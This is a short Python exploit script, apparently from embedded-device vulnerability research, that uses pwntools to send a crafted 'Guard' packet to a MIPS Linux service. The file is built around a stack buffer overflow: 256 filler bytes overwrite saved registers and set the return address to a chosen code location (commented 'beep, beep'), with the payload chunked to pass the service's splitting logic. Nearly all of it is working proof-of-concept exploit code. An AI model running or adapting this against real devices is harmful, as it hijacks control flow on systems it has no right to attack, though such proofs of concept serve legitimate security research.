#!/usr/bin/env python3

import pwn
import struct as s
from time import sleep
from common import info, createPkt

from config import *

def createGuard(msg_type=0x4fb5, payload=b''):

    #   subCmd with data
    subPkt = s.pack('<I', 0x4f92) #   subCmd
    subPkt += s.pack('<I', 0)
    subPkt += s.pack('<I', 0)
    subPkt += s.pack('<I', 0)
    subPkt += s.pack('<I', 0)
    subPkt += s.pack('<I', 0)      #   guard_icomm
    subPkt += s.pack('<i', -1)     #   
    subPkt += s.pack('<I', 10+2)   #   itemCnt
    
    payload = b'A'*256
    assert(len(payload) == 256)

    payload += s.pack('<I', 0x00000000)    #   s0
    payload += s.pack('<I', 0x11111111)    #   s1

    payload += s.pack('<I', 0x22222222)    #   s2
    payload += s.pack('<I', 0x33333333)    #   s3
    payload += s.pack('<I', 0x51242c)      #   ra ==> beep, beep
    payload += s.pack('<I', 0x55555555)    #   ???
    payload += s.pack('<I', 0x66666666)    #   ???
    payload += s.pack('<I', 0x77777777)    #   ???

    subPkt += packForSplitting(payload)

    return createPkt(msg_type, subPkt)

def packForSplitting(p):
    assert(len(p) % 0x18 == 0)
    o = b''
    for i in range(len(p)-0x18, 0, -0x18):
        o += p[i:i+0x18]

    assert(len(o) % 0x18 == 0)

    return o

def main():
    pwn.context.update(os='linux', arch='mips')

    r = pwn.remote(remoteIp, remotePort)

    info("Sending Guard packet")
    r.send(createGuard())
    sleep(1)
    #   wait for EoF, Alloca will crash
    r.interactive()
    r.close()

if __name__ == "__main__":
    main()
